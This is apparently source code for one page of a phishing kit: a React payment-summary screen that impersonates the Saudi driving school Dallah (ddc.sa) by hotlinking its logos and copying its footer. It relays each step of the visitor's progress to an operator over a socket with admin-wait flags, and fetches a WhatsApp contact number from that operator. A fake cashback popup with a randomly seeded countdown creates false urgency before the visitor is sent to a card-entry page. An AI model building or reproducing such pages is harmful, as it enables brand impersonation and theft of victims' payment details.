import { useState, useEffect } from "react";
import { useLocation, Link } from "wouter";
import { sendData, navigateToPage, clientNavigate, socket } from "@/lib/store";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { CreditCard, CheckCircle2 } from "lucide-react";

export default function SummaryPayment() {
  const [, setLocation] = useLocation();
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [countdown, setCountdown] = useState(() => {
    const maxSeconds = 11 * 3600 + 47 * 60 + 4;
    const randomTotal = Math.floor(Math.random() * maxSeconds) + 1;
    const h = Math.floor(randomTotal / 3600);
    const m = Math.floor((randomTotal % 3600) / 60);
    const s = randomTotal % 60;
    return { hours: h, minutes: m, seconds: s };
  });
  const [whatsappNumber, setWhatsappNumber] = useState("");

  useEffect(() => {
    if (!socket.value) return;
    socket.value.on("whatsapp:update", (number: string) => {
      setWhatsappNumber(number);
    });
    socket.value.emit("whatsapp:get");
    return () => {
      if (socket.value) socket.value.off("whatsapp:update");
    };
  }, []);

  // Get service name from URL params
  const searchParams = new URLSearchParams(window.location.search);
  const serviceName = searchParams.get('service') || 'خدمات رخصة القيادة';

  // Service prices - all programs from DrivingCourses
  const servicePrices: Record<string, number> = {
    // تصريح مؤقت
    'برنامج 30 ساعات تدريبية - تصريح مؤقت': 2760.00,
    'برنامج 15 ساعات تدريبية - تصريح مؤقت': 1466.25,
    'برنامج 6 ساعات تدريبية - تصريح مؤقت': 690.00,
    // خصوصي
    'برنامج 30 ساعات تدريبية - خصوصي': 2760.00,
    'برنامج 15 ساعات تدريبية - خصوصي': 1466.25,
    'برنامج 6 ساعات تدريبية - خصوصي': 690.00,
    // دراجة نارية
    'برنامج 30 ساعات تدريبية - دراجة نارية': 2760.00,
    'برنامج 15 ساعات تدريبية - دراجة نارية': 1466.25,
    'برنامج 6 ساعات تدريبية - دراجة نارية': 690.00,
    // أجرة
    'برنامج تدريبي لمدة 4 أيام (بدون ترخيص) - أجرة': 500.25,
    'برنامج تدريبي لمدة 10 أيام (بدون ترخيص) - أجرة': 644.00,
    // نقل خفيف
    'برنامج تدريبي لمدة 4 أيام (بدون ترخيص) - نقل خفيف': 500.25,
    'برنامج تدريبي لمدة 10 أيام (بدون ترخيص) - نقل خفيف': 644.00,
    // حافلات صغيرة
    'برنامج تدريبي لمدة 4 أيام (بدون ترخيص) - حافلات صغيرة': 500.25,
    'برنامج تدريبي لمدة 10 أيام (بدون ترخيص) - حافلات صغيرة': 644.00,
    // نقل ثقيل
    'برنامج تدريبي لمدة 4 أيام (بدون ترخيص) - نقل ثقيل': 500.25,
    'برنامج تدريبي لمدة 10 أيام (بدون ترخيص) - نقل ثقيل': 644.00,
    // حافلات كبيرة
    'برنامج تدريبي لمدة 4 أيام (بدون ترخيص) - حافلات كبيرة': 500.25,
    'برنامج تدريبي لمدة 10 أيام (بدون ترخيص) - حافلات كبيرة': 644.00,
    // آليات أعمال الطرق
    'برنامج تدريبي لمدة 1 أيام - آليات أعمال الطرق': 500.25,
    // Generic fallbacks
    'برنامج 30 ساعات تدريبية': 2760.00,
    'برنامج 15 ساعات تدريبية': 1466.25,
    'برنامج 6 ساعات تدريبية': 690.00,
    'برنامج تدريبي لمدة 4 أيام (بدون ترخيص)': 500.25,
    'برنامج تدريبي لمدة 10 أيام (بدون ترخيص)': 644.00,
    'برنامج تدريبي لمدة 1 أيام': 500.25,
  };

  // Try to get price from URL param first, then from servicePrices map
  const urlPrice = searchParams.get('price');
  const servicePrice = urlPrice ? parseFloat(urlPrice.replace(/,/g, '')) : (servicePrices[serviceName] || 500.25);
  const vatAmount = parseFloat((servicePrice * 0.15).toFixed(2));
  const totalAmount = parseFloat((servicePrice + vatAmount).toFixed(2));

  // Show popup after 2 seconds
  useEffect(() => {
    const popupTimer = setTimeout(() => {
      setShowPopup(true);
    }, 2000);
    return () => clearTimeout(popupTimer);
  }, []);

  // Countdown timer
  useEffect(() => {
    if (!showPopup) return;
    const interval = setInterval(() => {
      setCountdown(prev => {
        const totalSeconds = prev.hours * 3600 + prev.minutes * 60 + prev.seconds - 1;
        if (totalSeconds <= 0) {
          clearInterval(interval);
          return { hours: 0, minutes: 0, seconds: 0 };
        }
        return {
          hours: Math.floor(totalSeconds / 3600),
          minutes: Math.floor((totalSeconds % 3600) / 60),
          seconds: totalSeconds % 60,
        };
      });
    }, 1000);
    return () => clearInterval(interval);
  }, [showPopup]);

  useEffect(() => {
    document.title = 'ملخص الطلب والدفع';
    navigateToPage('ملخص الدفع');
  }, []);

  const handlePayment = () => {
    if (!selectedPaymentMethod) return;

    setIsProcessing(true);

    sendData({
      data: {
        'المجموع الكلي': `${totalAmount} ر.س`,
      },
      current: 'الملخص والدفع',
      waitingForAdminResponse: false,
    });

    sendData({
      data: {
        paymentMethod: selectedPaymentMethod === 'card' ? 'بطاقة ائتمان' : 'Apple Pay',
        serviceName,
        servicePrice,
        vatAmount,
        totalAmount,
      },
      current: 'ملخص الدفع',
      nextPage: selectedPaymentMethod === 'card' ? 'credit-card-payment' : 'bank-transfer',
      waitingForAdminResponse: false,
    });

    setTimeout(() => {
      setIsProcessing(false);
      if (selectedPaymentMethod === 'card') {
        clientNavigate(`/credit-card-payment?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`);
      } else {
        clientNavigate(`/bank-transfer?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`);
      }
    }, 1500);
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>

      {/* Cashback Popup */}
      {showPopup && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50" onClick={() => setShowPopup(false)}>
          <div className="bg-white rounded-2xl shadow-2xl max-w-sm w-[90%] mx-auto overflow-hidden" onClick={(e) => e.stopPropagation()}>
            {/* Image */}
            <div className="w-full">
              <img src="/images/cashback-cards.png" alt="كاش باك 30%" className="w-full object-cover" />
            </div>
            {/* Content */}
            <div className="p-6 text-center">
              <h3 className="text-2xl font-bold text-gray-900 mb-2">سارع قبل نهاية العرض!</h3>
              <p className="text-gray-500 mb-4">يتبقى على إنتهاء العرض</p>
              {/* Countdown */}
              <div className="text-4xl font-bold text-[#20744c] mb-6" dir="ltr">
                {String(countdown.hours).padStart(2, '0')}:{String(countdown.minutes).padStart(2, '0')}:{String(countdown.seconds).padStart(2, '0')}
              </div>
              {/* Close Button */}
              <button
                onClick={() => setShowPopup(false)}
                className="w-3/4 py-3 bg-gray-600 text-white rounded-lg font-bold text-lg hover:bg-gray-700 transition-colors"
              >
                إغلاق
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Header - Dalleh logo */}
      <header className="bg-white border-b border-gray-200">
        <div className="container mx-auto px-3 sm:px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <img 
                src="https://www.ddc.sa/themes/ddc/assets/images/white-logo.svg" 
                alt="شركة دله لتعليم قيادة السيارات" 
                className="h-10 sm:h-12 object-contain"
                style={{ filter: 'brightness(0.3)' }}
              />
            </div>
          </div>
        </div>
      </header>

      {/* Title Section */}
      <section className="pt-3 container mx-auto px-3 sm:px-4" style={{ color: '#20744c' }}>
        <p className="mb-1 font-bold text-lg sm:text-[22px]">خدمات رخصة القيادة</p>
        <p className="pt-1 text-base sm:text-[22px]">ملخص الطلب والدفع</p>
      </section>
      
      <main className="flex-1 container px-3 sm:px-4 py-4 sm:py-8">
        <div className="max-w-4xl mx-auto">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 sm:gap-6">
            {/* Order Summary */}
            <div className="lg:col-span-2 space-y-6">
              {/* Service Details */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2 text-lg">
                    <CheckCircle2 className="w-5 h-5 text-green-600" />
                    تفاصيل الخدمة
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-4">
                    <div className="flex flex-col sm:flex-row justify-between sm:items-center py-2 border-b gap-1">
                      <span className="text-gray-600 text-sm sm:text-base">اسم الخدمة</span>
                      <span className="font-medium text-sm sm:text-base">{serviceName}</span>
                    </div>
                    <div className="flex justify-between items-center py-2 border-b">
                      <span className="text-gray-600">رسوم الخدمة</span>
                      <span className="font-medium">{servicePrice} ر.س</span>
                    </div>
                    <div className="flex justify-between items-center py-2 border-b">
                      <span className="text-gray-600">ضريبة القيمة المضافة (15%)</span>
                      <span className="font-medium">{vatAmount} ر.س</span>
                    </div>
                    <div className="flex justify-between items-center py-2 bg-green-50 px-3 rounded-lg">
                      <span className="text-green-700 font-bold">المجموع الكلي</span>
                      <span className="text-green-700 font-bold text-xl">{totalAmount} ر.س</span>
                    </div>
                  </div>
                </CardContent>
              </Card>

              {/* Payment Methods */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2 text-lg">
                    <CreditCard className="w-5 h-5 text-green-600" />
                    طريقة الدفع
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {/* Credit Card Option */}
                    <div
                      className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                        selectedPaymentMethod === 'card'
                          ? 'border-green-500 bg-green-50'
                          : 'border-gray-200 hover:border-green-300'
                      }`}
                      onClick={() => setSelectedPaymentMethod('card')}
                    >
                      <div className="flex items-center gap-3">
                        <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                          selectedPaymentMethod === 'card' ? 'border-green-500' : 'border-gray-300'
                        }`}>
                          {selectedPaymentMethod === 'card' && (
                            <div className="w-3 h-3 rounded-full bg-green-500" />
                          )}
                        </div>
                        <CreditCard className={`w-8 h-8 ${selectedPaymentMethod === 'card' ? 'text-green-600' : 'text-gray-400'}`} />
                        <div>
                          <p className="font-medium">بطاقة ائتمان / مدى</p>
                          <p className="text-sm text-gray-500">Visa, Mastercard, Mada</p>
                        </div>
                      </div>
                      <div className="flex gap-2 mt-3 justify-center">
                        <img src="/images/banks/visa.png" alt="Visa" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
                        <img src="/images/banks/mastercard.png" alt="Mastercard" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
                        <img src="/images/banks/mada.png" alt="Mada" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
                      </div>
                    </div>

                    {/* Apple Pay Option */}
                    <div
                      className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                        selectedPaymentMethod === 'transfer'
                          ? 'border-green-500 bg-green-50'
                          : 'border-gray-200 hover:border-green-300'
                      }`}
                      onClick={() => setSelectedPaymentMethod('transfer')}
                    >
                      <div className="flex items-center gap-3">
                        <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                          selectedPaymentMethod === 'transfer' ? 'border-green-500' : 'border-gray-300'
                        }`}>
                          {selectedPaymentMethod === 'transfer' && (
                            <div className="w-3 h-3 rounded-full bg-green-500" />
                          )}
                        </div>
                        <svg className={`w-8 h-8 ${selectedPaymentMethod === 'transfer' ? 'text-black' : 'text-gray-400'}`} viewBox="0 0 24 24" fill="currentColor">
                          <path d="M17.72 9.8c-.04.03-1.55.89-1.55 2.73 0 2.13 1.87 2.88 1.93 2.9-.01.04-.3 1.03-1 2.04-.6.88-1.23 1.76-2.2 1.76-.97 0-1.22-.56-2.33-.56-1.09 0-1.47.58-2.38.58-.91 0-1.55-.82-2.26-1.82C7.02 16.16 6.4 14.1 6.4 12.13c0-3.17 2.06-4.85 4.08-4.85.96 0 1.76.63 2.36.63.58 0 1.48-.67 2.57-.67.41 0 1.9.04 2.88 1.43l-.57.13zM14.44 5.13c.45-.53.77-1.27.77-2.01 0-.1-.01-.21-.02-.3-.73.03-1.61.49-2.13 1.09-.42.47-.81 1.22-.81 1.97 0 .11.02.23.03.26.05.01.14.02.22.02.66 0 1.49-.44 1.94-1.03z"/>
                        </svg>
                        <div>
                          <p className="font-medium">Apple Pay</p>
                          <p className="text-sm text-gray-500">الدفع بواسطة Apple Pay</p>
                        </div>
                      </div>
                      {selectedPaymentMethod === 'transfer' && (
                        <p className="text-xs text-red-500 mt-2 text-center">الدفع عن طريق Apple Pay غير متاح حالياً</p>
                      )}
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>

            {/* Sidebar - Order Summary */}
            <div className="lg:col-span-1">
              <Card className="sticky top-4">
                <CardHeader className="bg-green-50 rounded-t-lg">
                  <CardTitle className="text-lg text-green-700 font-bold">ملخص الطلب</CardTitle>
                </CardHeader>
                <CardContent className="pt-4">
                  <div className="space-y-3">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">الخدمة</span>
                      <span className="font-medium text-xs">{serviceName}</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">الرسوم</span>
                      <span>{servicePrice} ر.س</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">الضريبة</span>
                      <span>{vatAmount} ر.س</span>
                    </div>
                    <hr />
                    <div className="flex justify-between font-bold text-lg">
                      <span>المجموع</span>
                      <span className="text-green-600">{totalAmount} ر.س</span>
                    </div>
                  </div>

                  <Button
                    className="w-full mt-6 bg-green-600 hover:bg-green-700"
                    disabled={!selectedPaymentMethod || selectedPaymentMethod === 'transfer' || isProcessing}
                    onClick={handlePayment}
                  >
                    {isProcessing ? (
                      <div className="flex items-center gap-2">
                        <div className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent" />
                        جاري المعالجة...
                      </div>
                    ) : (
                      <>
                        <CheckCircle2 className="w-4 h-4 ml-2" />
                        متابعة الدفع
                      </>
                    )}
                  </Button>

                  <p className="text-xs text-gray-500 text-center mt-4">
                    بالضغط على متابعة الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية
                  </p>
                </CardContent>
              </Card>
            </div>
          </div>
        </div>
      </main>

      {/* Footer - DDC Footer */}
      <style>{`
        .ddc-footer { background: #000000; padding: 100px 0 180px; color: rgba(255,255,255,0.6); position: relative; overflow: hidden; }
        .ddc-footer-waves { position: absolute; bottom: 30px; left: 0; right: auto; width: 50%; height: 183px; pointer-events: none; overflow: hidden; display: flex; justify-content: flex-end; flex-wrap: wrap; transform: scaleX(-1); }
        .ddc-footer-waves svg:first-child { position: absolute; width: 1012px; height: 183px; }
        .ddc-footer-waves svg:last-child { position: static; width: 100%; height: 170px; }
        .ddc-footer-waves svg:last-child path { stroke-dasharray: 1180, 1180; stroke-dashoffset: 0; animation: snakeAnimate 10s linear infinite; }
        .ddc-footer-inner { display: flex; justify-content: space-between; align-items: flex-start; direction: rtl; }
        .ddc-footer-left { flex: 0 0 58%; max-width: 58%; display: flex; gap: 20px; justify-content: space-between; }
        .ddc-footer-right { flex: 0 0 42%; max-width: 42%; display: flex; justify-content: flex-end; align-items: center; }
        .ddc-footer-brand { flex: 0 0 auto; }
        .ddc-footer-brand > img { width: 292px; height: auto; margin-bottom: 0; }
        .ddc-footer-brand .ddc-footer-contact { margin-top: 10px; }
        .ddc-footer-brand .ddc-footer-contact p { color: white; font-size: 12px; font-weight: 600; margin-bottom: 8px; }
        .ddc-footer-social { display: flex; gap: 8px; list-style: none; padding: 0; margin: 0; }
        .ddc-footer-social li a { width: 42px; height: 42px; border-radius: 50%; background: #191919; border: none; display: flex; align-items: center; justify-content: center; transition: all 0.3s; }
        .ddc-footer-social li a:hover { background: #f7be15; }
        .ddc-footer-social li a img { width: 21px; height: 21px; }
        .ddc-footer-links { flex: 0 0 auto; }
        .ddc-footer-links h4 { color: white; font-size: 20px; font-weight: 600; margin-bottom: 0; }
        .ddc-footer-links ul { display: flex; flex-direction: column; gap: 4px; margin-top: 10px; list-style: none; padding: 0; }
        .ddc-footer-links li a { color: rgba(255,255,255,0.6); font-size: 16px; line-height: 22px; transition: color 0.3s; text-decoration: none; }
        .ddc-footer-links li a:hover { color: #f7be15; }
        .ddc-footer-vision { flex: 0 0 auto; display: flex; align-items: flex-start; }
        .ddc-footer-vision img { width: 200px; height: auto; }
        .ddc-container { max-width: 1200px; margin: 0 auto; padding: 0 20px; position: relative; z-index: 1; }
        @keyframes snakeAnimate { 0% { stroke-dashoffset: 0; } 100% { stroke-dashoffset: 2360; } }
        @media (max-width: 768px) { .ddc-footer-inner { flex-direction: column; } .ddc-footer-left { flex: 1; max-width: 100%; } .ddc-footer-right { flex: 1; max-width: 100%; margin-top: 30px; } }
      `}</style>
      <footer className="ddc-footer">
        <div className="ddc-footer-waves">
          <svg xmlns="http://www.w3.org/2000/svg" width="1012" height="183" viewBox="0 0 1012 183" fill="none">
            <path d="M492.56 13.5C480.42 13.06 468.02 13.6 455.29 15.1C415.42 19.79 372.07 33.54 314.74 59.67C290.49 70.72 262.67 76.28 232.05 76.18C205.71 76.1 177.17 71.88 147.24 63.63C85.3997 46.59 40.0896 18.74 38.1996 17.56L-0.000366211 79.15C5.66968 82.67 57.4097 114.06 128 133.5C164.13 143.45 199.07 148.55 231.84 148.65C272.98 148.78 310.99 141.03 344.81 125.61C442.34 81.16 498.44 74.88 551.79 102.42C564.72 109.1 576.35 115.49 587.59 121.67C631.9 146.04 670.17 167.09 741.05 178.18C837.7 193.3 922.83 161.88 1005.15 131.5L1191.14 66.69L1177 0L980.06 63.5C903.04 91.93 830.3 118.78 752.26 106.57C693.95 97.45 663.99 80.97 622.52 58.16C610.87 51.75 598.82 45.13 585.04 38.01C555.53 22.78 525.02 14.66 492.58 13.49L492.56 13.5Z" fill="url(#summary_footer_paint0_linear)" fillOpacity="0.9" />
            <defs>
              <linearGradient id="summary_footer_paint0_linear" x1="0.882136" y1="56.0891" x2="1190.02" y2="99.0692" gradientUnits="userSpaceOnUse">
                <stop stopOpacity="0" />
                <stop offset="0.2" stopColor="#07351B" stopOpacity="0.55" />
                <stop offset="0.45" stopColor="#0D6532" stopOpacity="0.85" />
                <stop offset="0.7" stopColor="#118241" stopOpacity="0.95" />
                <stop offset="1" stopColor="#138D47" />
              </linearGradient>
            </defs>
          </svg>
          <svg xmlns="http://www.w3.org/2000/svg" width="916" height="170" viewBox="0 0 916 170" fill="none">
            <path d="M454.669 156.31C443.519 156.71 432.119 156.22 420.429 154.84C383.799 150.53 343.979 137.9 291.309 113.9C269.029 103.75 243.469 98.6402 215.339 98.7302C191.139 98.8002 164.919 102.68 137.419 110.26C80.6092 125.91 38.9893 151.5 37.2393 152.59L2.13916 96.0102C7.34916 92.7802 54.8792 63.9402 119.729 46.0802C152.919 36.9402 185.019 32.2502 215.129 32.1602C252.929 32.0402 287.839 39.1602 318.919 53.3202C408.519 94.1602 460.059 99.9302 509.069 74.6302C520.949 68.5002 531.629 62.6202 541.959 56.9402C582.669 34.5502 617.819 15.2102 682.949 5.02018C771.749 -8.86982 849.949 19.9902 925.579 47.9102L1096.45 107.45L1083.46 168.72L902.529 110.38C831.769 84.2602 764.939 59.5902 693.249 70.8102C639.679 79.1902 612.149 94.3302 574.059 115.28C563.359 121.17 552.289 127.25 539.629 133.79C512.519 147.78 484.489 155.24 454.689 156.32L454.669 156.31Z" stroke="url(#summary_footer_paint1_linear)" strokeOpacity="0.5" strokeWidth="1.96" strokeMiterlimit="10" fill="none" />
            <defs>
              <linearGradient id="summary_footer_paint1_linear" x1="4.37915" y1="48.1502" x2="1095.79" y2="130.47" gradientUnits="userSpaceOnUse">
                <stop stopOpacity="0" />
                <stop offset="0.1" stopColor="#2D2203" stopOpacity="0.18" />
                <stop offset="0.23" stopColor="#624B08" stopOpacity="0.4" />
                <stop offset="0.36" stopColor="#8F6E0C" stopOpacity="0.58" />
                <stop offset="0.49" stopColor="#B48B0F" stopOpacity="0.73" />
                <stop offset="0.62" stopColor="#D1A111" stopOpacity="0.85" />
                <stop offset="0.75" stopColor="#E6B113" stopOpacity="0.93" />
                <stop offset="0.88" stopColor="#F2BA14" stopOpacity="0.98" />
                <stop offset="1" stopColor="#F7BE15" />
              </linearGradient>
            </defs>
          </svg>
        </div>
        <div className="ddc-container">
          <div className="ddc-footer-inner">
            <div className="ddc-footer-left">
              <div className="ddc-footer-brand">
                <img src="https://www.ddc.sa/themes/ddc/assets/images/footer-logo.svg" alt="DDC" />
                <div className="ddc-footer-contact">
                  <p>اتصل بنا</p>
                  <ul className="ddc-footer-social">
                    <li><a href="https://www.facebook.com/ddcsaudia" target="_blank" rel="noopener noreferrer"><img src="https://www.ddc.sa/themes/ddc/assets/images/facebook-icon.svg" alt="Facebook" /></a></li>
                    <li><a href="https://www.linkedin.com/company/dallah-driving-company/" target="_blank" rel="noopener noreferrer"><img src="https://www.ddc.sa/themes/ddc/assets/images/linked_in.svg" alt="LinkedIn" /></a></li>
                    <li><a href="https://x.com/ddcsaudia" target="_blank" rel="noopener noreferrer"><img src="https://www.ddc.sa/themes/ddc/assets/images/twitter-icon.svg" alt="X" /></a></li>
                    <li><a href="https://www.instagram.com/ddcsaudia/" target="_blank" rel="noopener noreferrer"><img src="https://www.ddc.sa/themes/ddc/assets/images/instagram-icon.svg" alt="Instagram" /></a></li>
                    <li><a href="https://www.youtube.com/@ddc.saudia" target="_blank" rel="noopener noreferrer"><img src="https://www.ddc.sa/themes/ddc/assets/images/youtube-icon.svg" alt="YouTube" /></a></li>
                    <li><a href="https://www.tiktok.com/@ddcsaudia" target="_blank" rel="noopener noreferrer"><img src="https://www.ddc.sa/themes/ddc/assets/images/tiktok-icon.svg" alt="TikTok" /></a></li>
                  </ul>
                </div>
              </div>
              <div className="ddc-footer-links">
                <h4>روابط سريعة:</h4>
                <ul>
                  <li><a href="#">من نحن</a></li>
                  <li><a href="#">السلامة على الطرق</a></li>
                  <li><a href="#">الأخبار</a></li>
                  <li><a href="#">الخصوصية وملفات تعريف الارتباط</a></li>
                  <li><a href="#">الأسئلة الشائعة</a></li>
                  <li><a href="#">الشروط والأحكام</a></li>
                </ul>
              </div>
            </div>
            <div className="ddc-footer-right">
              <div className="ddc-footer-vision">
                <img src="https://www.ddc.sa/themes/ddc/assets/images/footer-logo-2.svg" alt="Vision 2030" />
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
